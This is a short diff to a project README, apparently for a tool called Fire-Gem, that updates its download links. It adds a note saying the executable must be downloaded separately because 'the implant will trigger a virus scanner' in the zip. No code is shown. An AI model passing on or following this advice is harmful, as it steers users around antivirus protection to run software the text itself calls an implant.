@@ -17,7 +17,8 @@
 
 
 ###### Uplink : <a href="https://github.com/mercwar/Fire-Gem/tree/main/Fire-Gem-v2.02">Folder</a>  
-###### Downlink : <a href="https://github.com/mercwar/Fire-Gem/raw/main/Fire-Gem-v2.02.zip">Zip</a>
+###### Downlink : <a href="https://github.com/mercwar/Fire-Gem/raw/main/Fire-Gem-v2.02.zip">Zip</a> 
+###### *note: there is now no .exe file in the Fire-Gem-v2.02 zip, you have to download it from the folder, because the implant will trigger a virus scanner in the zip.*
 
 
 
